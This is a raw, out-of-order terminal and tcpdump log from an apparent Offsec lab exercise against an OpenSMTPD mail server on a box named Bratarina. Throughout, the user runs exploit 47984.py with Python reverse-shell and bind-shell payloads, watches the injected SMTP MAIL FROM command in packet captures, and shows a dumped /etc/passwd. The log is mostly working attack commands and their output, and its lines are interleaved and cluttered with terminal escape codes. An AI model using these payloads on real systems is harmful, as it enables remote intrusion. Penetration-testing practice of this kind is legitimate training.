+10:00:48.499013 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 208:258, ack 207, win 509, options [nop,nop,TS val 2067751143 ecr 2681774055], length 50: SMTP: 250 2.0.0 587858b9 M
+$ [10:03:04] sudo listener 80
+
+$ [10:03:17] sudo tcpdump -ni any host $BoxIP and tcp
+:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
+_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
+_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
+postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:55:46][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LocalIP\",4444));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"[K[A[A[50C[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33mc[33mo[33mn[33mn[33me[33mc[33mt[33m([33m([36m\[36m"[39m[36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[36m\[36m"[39m[33m,[33m4[33m4[33m4[33m4[33m)[33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33ms[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:00:48][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LocalIP\",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"[K[A[66D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms[33m=[33ms
+$ [10:03:24] python3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LocalIP\",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+essage accepted for delivery
+10:00:48.499138 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 207:213, ack 258, win 63, options [nop,nop,TS val 2681774065 ecr 2067751143], length 6: SMTP: QUIT
+10:00:48.507192 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 258:273, ack 213, win 509, options [nop,nop,TS val 2067751151 ecr 2681774065], length 15: SMTP: 221 2.0.0 Bye
+10:00:48.507208 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [F.], seq 273, ack 213, win 509, options [nop,nop,TS val 2067751151 ecr 2681774065], length 0
+10:00:48.508478 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [F.], seq 213, ack 274, win 63, options [nop,nop,TS val 2681774074 ecr 2067751151], length 0
+10:00:48.516994 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [.], ack 214, win 509, options [nop,nop,TS val 2067751161 ecr 2681774074], length 0
+^C
+21 packets captured
+21 packets received by filter
+0 packets dropped by kernel
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:03:15][39m $ [K[?1h=[?2004hsudo tcpdump -ni any host $BoxIP and tcp[K[A[17C[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mt[32mc[32mp[32md[32mu[32mm[32mp[39m[28C[?1l>[?2004l
+tcpdump: WARNING: any: That device doesn't support promiscuous mode
+(Promiscuous mode not supported on the "any" device)
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+10:03:24.744580 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [S], seq 2881699867, win 64240, options [mss 1460,sackOK,TS val 3932290369 ecr 0,nop,wscale 10], length 0
+10:03:24.764140 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [S.], seq 116753327, ack 2881699868, win 65160, options [mss 1400,sackOK,TS val 2067907404 ecr 3932290369,nop,wscale 7], length 0
+10:03:24.764182 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [.], ack 1, win 63, options [nop,nop,TS val 3932290389 ecr 2067907404], length 0
+10:03:24.778115 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 1:32, ack 1, win 510, options [nop,nop,TS val 2067907420 ecr 3932290389], length 31: SMTP: 220 bratarina ESMTP OpenSMTPD
+10:03:24.778129 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [.], ack 32, win 63, options [nop,nop,TS val 3932290403 ecr 2067907420], length 0
+10:03:24.778254 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 1:9, ack 32, win 63, options [nop,nop,TS val 3932290403 ecr 2067907420], length 8: SMTP: HELO x
+10:03:24.787780 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [.], ack 9, win 510, options [nop,nop,TS val 2067907429 ecr 3932290403], length 0
+10:03:24.787798 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 32:93, ack 9, win 510, options [nop,nop,TS val 2067907429 ecr 3932290403], length 61: SMTP: 250 bratarina Hello x [192.168.45.194], pleased to meet you
+10:03:24.790015 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 9:173, ack 93, win 63, options [nop,nop,TS val 3932290415 ecr 2067907429], length 164: SMTP: MAIL FROM:<;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")';>
+10:03:24.806910 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 93:107, ack 173, win 509, options [nop,nop,TS val 2067907448 ecr 3932290415], length 14: SMTP: 250 2.0.0 Ok
+10:03:24.807039 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 173:189, ack 107, win 63, options [nop,nop,TS val 3932290432 ecr 2067907448], length 16: SMTP: RCPT TO:<root>
+10:03:24.820080 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 107:158, ack 189, win 509, options [nop,nop,TS val 2067907461 ecr 3932290432], length 51: SMTP: 250 2.1.5 
+$ [10:03:46] sudo nc -lvnp 80
+
+$ [10:03:51] python3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LocalIP\",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+Destination address valid: Recipient ok
+10:03:24.821943 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 189:195, ack 158, win 63, options [nop,nop,TS val 3932290447 ecr 2067907461], length 6: SMTP: DATA
+10:03:24.832245 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 158:208, ack 195, win 509, options [nop,nop,TS val 2067907474 ecr 3932290447], length 50: SMTP: 354 Enter mail, end with "." on a line by itself
+10:03:24.832396 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 195:205, ack 208, win 63, options [nop,nop,TS val 3932290457 ecr 2067907474], length 10: SMTP: 
+10:03:24.842589 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 208:258, ack 205, win 509, options [nop,nop,TS val 2067907484 ecr 3932290457], length 50: SMTP: 250 2.0.0 92485bb5 Message accepted for delivery
+10:03:24.842732 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [P.], seq 205:211, ack 258, win 63, options [nop,nop,TS val 3932290467 ecr 2067907484], length 6: SMTP: QUIT
+10:03:24.853258 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [P.], seq 258:273, ack 211, win 509, options [nop,nop,TS val 2067907495 ecr 3932290467], length 15: SMTP: 221 2.0.0 Bye
+10:03:24.853280 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [F.], seq 273, ack 211, win 509, options [nop,nop,TS val 2067907495 ecr 3932290467], length 0
+10:03:24.855086 tun0  Out IP 192.168.45.194.40706 > 192.168.183.71.25: Flags [F.], seq 211, ack 274, win 63, options [nop,nop,TS val 3932290480 ecr 2067907495], length 0
+10:03:24.865924 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.40706: Flags [.], ack 212, win 509, options [nop,nop,TS val 2067907506 ecr 3932290480], length 0
+10:03:51.366642 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [S], seq 2232480298, win 64240, options [mss 1460,sackOK,TS val 3202914541 ecr 0,nop,wscale 10], length 0
+10:03:51.388509 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [S.], seq 946069131, ack 2232480299, win 65160, options [mss 1400,sackOK,TS val 2067934027 ecr 3202914541,nop,wscale 7], length 0
+10:03:51.388535 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [.], ack 1, win 63, options [nop,nop,TS val 3202914563 ecr 2067934027], length 0
+10:03:51.401068 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 1:32, ack 1, win 510, options [nop,nop,TS val 2067934042 ecr 3202914563], length 31: SMTP: 220 bratarina ESMTP OpenSMTPD
+10:03:51.401085 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [.], ack 32, win 63, options [nop,nop,TS val 3202914576 ecr 2067934042], length 0
+10:03:51.401220 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 1:9, ack 32, win 63, options [nop,nop,TS val 3202914576 ecr 2067934042], length 8: SMTP: HELO x
+10:03:51.411804 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [.], ack 9, win 510, options [nop,nop,TS val 2067934051 ecr 3202914576], length 0
+10:03:51.411820 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 32:93, ack 9, win 510, options [nop,nop,TS val 2067934051 ecr 3202914576], length 61: SMTP: 250 bratarina Hello x [192.168.45.194], pleased to meet you
+10:03:51.411990 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 9:173, ack 93, win 63, options [nop,nop,TS val 3202914587 ecr 2067934051], length 164: SMTP: MAIL FROM:<;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")';>
+10:03:51.422679 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq 93:107, ack 173, win 509, options [nop,nop,TS val 2067934064 ecr 3202914587], length 14: SMTP: 250 2.0.0 Ok
+10:03:51.422794 tun0  Out IP 192.168.45.194.50370 > 192.168.183.71.25: Flags [P.], seq 173:189, ack 107, win 63, options [nop,nop,TS val 3202914597 ecr 2067934064], length 16: SMTP: RCPT TO:<root>
+10:03:51.431902 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.50370: Flags [P.], seq
+$ [10:05:46] sudo tcpdump -ni tun0 icmp
+
+$ [10:05:53] python3 exploits/47984.py $BoxIP 25 "ping -c 4 $LocalIP"
+[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33mc[33mo[33mn[33mn[33me[33mc[33mt[33m([33m([36m\[36m"[39m[36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[36m\[36m"[39m[33m,[33m8[33m0[33m)[33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33ms[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:03:24][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LocalIP\",80));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"[K[A[66D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33mc[33mo[33mn[33mn[33me[33mc[33mt[33m([33m([36m\[36m"[39m[36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[36m\[36m"[39m[33m,[33m8[33m0[33m)[33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33ms[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:03:51][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "ping -c 4 $LocalIP"[56D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33mi[33mn[33mg[33m [33m-[33mc[33m [33m4[33m [36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:05:53][39m $ [K[?1h=[?2004h[7m^[[27m[200~python3 exploits/47984.py $BoxIP 25 "python3 -c 'import sock [K[Keet,os,pty;s=socket.socket();s.bind((\"\",5555));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pt [K[Kyy.spawn(\"/bin/bash\")'"~[A[A[26C[1m[7m[31m^[1m[7m[31m[[0m[27m[39m[1m[31m[[1m[31m2[1m[31m0[1m[31m0[1m[31m~[1m[31mp[1m[31my[1m[31mt[1m[31mh[1m[31mo[1m[31mn[1m[31m3[0m[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms
+$ [10:07:22] [200~python3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"\",5555));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"~
+
+$ [10:07:36] python3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"\",5555));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+
+$ [10:07:38] nc $BoxIP 5555
+
+$ [10:09:52] id
+[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33mb[33mi[33mn[33md[33m([33m([36m\[36m"[39m[36m\[36m"[39m[33m,[33m5[33m5[33m5[33m5[33m)[33m)[33m;[33ms[33m.[33ml[33mi[33ms[33mt[33me[33mn[33m([33m1[33m)[33m;[33mc[33m,[33ma[33m=[33ms[33m.[33ma[33mc[33mc[33me[33mp[33mt[33m([33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[1C[?1l>[?2004l
+zsh: bad pattern: ^[[200~python3
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:07:22][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"\",5555));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"[K[A[A[34C[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33mp[33mt[33my[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33mb[33mi[33mn[33md[33m([33m([36m\[36m"[39m[36m\[36m"[39m[33m,[33m5[33m5[33m5[33m5[33m)[33m)[33m;[33ms[33m.[33ml[33mi[33ms[33mt[33me[33mn[33m([33m1[33m)[33m;[33mc[33m,[33ma[33m=[33ms[33m.[33ma[33mc[33mc[33me[33mp[33mt[33m([33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33m0[33m,[33m1[33m,[33m2[33m)[33m][33m;[33mp[33mt[33my[33m.[33ms[33mp[33ma[33mw[33mn[33m([36m\[36m"[39m[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[36m\[36m"[39m[33m)[33m'[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:07:36][39m $ [K[?1h=[?2004hpython3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind((\"\",5556));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'"[K[A[A[12C[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33mo[33ms[33m,[33ms[33mu[33mb[33mp[33mr[33mo[33mc[33me[33ms[33ms[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m([33m)[33m;[33ms[33m.[33mb[33mi[33mn[33md[33m([33m([36m\[36m"[39m[36m\[36m"[39m[33m,[33m5[33m5[33m5[33m6[33m)[33m)[33m;[33ms[33m.[33ml[33mi[33ms[33mt[33me[33mn[33m([33m1[33m)[33m;[33mc[33m,[33ma[33m=[33ms[33m.[33ma[33mc[33mc[33me[33mp[33mt[33m([33m)[33m;[33m[[33mo[33ms[33m.[33md[33mu[33mp[33m2[33m([33mc[33m.[33mf[33mi[33ml[33me[33mn[33mo[33m([33m)[33m,[33mx[33m)[33m [33mf[33mo[33mr[33m [33mx[33m [33mi[33mn[33m [33m([33
+$ [10:10:34] python3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind((\"\",5556));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'"
+
+$ [10:10:40] nc $BoxIP 5556
+
+$ [10:12:54] id
+
+$ [10:14:20] python3 exploits/47984.py 192.168.183.71 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",5557));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+
+$ [10:14:27] nc -nv $BoxIP 5557
+Script started on 2026-08-27 09:45:19+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="117" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:45:19][39m $ [K[?1h=[?2004hl[4ml[24m[4ml[4mi[24m[24m[1m[31ml[24m[1m[31mi[0m[39m[1m[31ml[1m[31mi[1m[31ms[0m[39m[1m[31ms[1m[31mt[0m[39m[1m[31mt[1m[31me[0m[39m[1m[31me[1m[31mn[0m[39m[1m[31mn[1m[31me[0m[39m[1m[31me[1m[31mr[0m[39m[8D[0m[32ml[0m[32mi[0m[32ms[0m[32mt[0m[32me[0m[32mn[0m[32me[0m[32mr[39m[?1l>[?2004l
+[+] Listening on :4444  (Ctrl+C to stop)
+Listening on 0.0.0.0 4444
+^C[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:03:02][39m $ [K[?1h=[?2004hsudo listener 80[K[A[41C[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32ml[32mi[32ms[32mt[32me[32mn[32me[32mr[39m[3C[?1l>[?2004l
+[sudo] password for kali: 
+sudo: listener: command not found
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:03:06][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[24m[90mudo l[90mi[90mstener 80[39m[K[A[42C[4ms[39m[4mu[24m[24m[32ms[24m[32mu[39m[32ms[32mu[32md[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[1m[31md[1m[31mo[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[4m[32mo[24m[39m[24m[39m [39mn [K[A[56C[4mn[24m [A[56C[4mn[4mc[24m[A[55C[24m[32mn[32mc[39m[32mc[32m [39m[32mc[39m[39m -lvnp 80[?1l>[?2004l
+Listening on 0.0.0.0 80
+^C
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:07:26][39m $ [K[?1h=[?2004hnc $BoxIP 5555[K[A[43C[32mn[32mc[39m[1B[45D[?1l>[?2004l
+id
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:09:52][39m $ [K[?1h=[?2004hiid[32mi[32md[39m[?1l>[?2004l
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),105(kismet),109(ssl-cert),116(bluetooth),121(lpadmin),124(wireshark),130(kaboxer),133(docker)
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:09:52][39m $ [K[?1h=[?2004hnc $BoxIP 5556[K[A[43C[32mn[32mc[39m[1B[45D[?1l>[?2004l
+id
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:12:54][39m $ [K[?1h=[?2004hiid[32mi[32md[39m[?1l>[?2004l
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),105(kismet),109(ssl-cert),116(bluetooth),121(lpadmin),124(wireshark),130(kaboxer),133(docker)
